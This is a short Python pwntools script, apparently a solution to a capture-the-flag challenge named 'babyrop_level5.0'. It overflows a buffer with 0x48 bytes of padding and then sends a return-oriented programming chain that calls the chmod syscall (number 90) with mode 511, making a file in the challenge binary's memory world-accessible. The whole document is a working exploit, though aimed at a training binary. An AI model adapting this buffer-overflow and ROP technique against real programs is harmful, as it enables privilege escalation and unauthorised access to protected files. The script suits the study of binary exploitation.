from pwn import *



p = process(["/challenge/babyrop_level5.0"])
buf = b"A" * (0x48)
context.arch = 'amd64'

elf = ELF('/challenge/babyrop_level5.0')

rop = ROP(elf)
pop_rax = rop.rax.address
pop_rdi = rop.rdi.address
pop_rsi = rop.rsi.address
syscall = rop.syscall.address
# chmod
rop.raw(pop_rax)
rop.raw(90)
rop.raw(pop_rdi)
rop.raw(0x403142)
rop.raw(pop_rsi)
rop.raw(511)
rop.raw(syscall)
payload = buf + rop.chain()

p.send(payload)
print(p.recvall().decode())
p.close()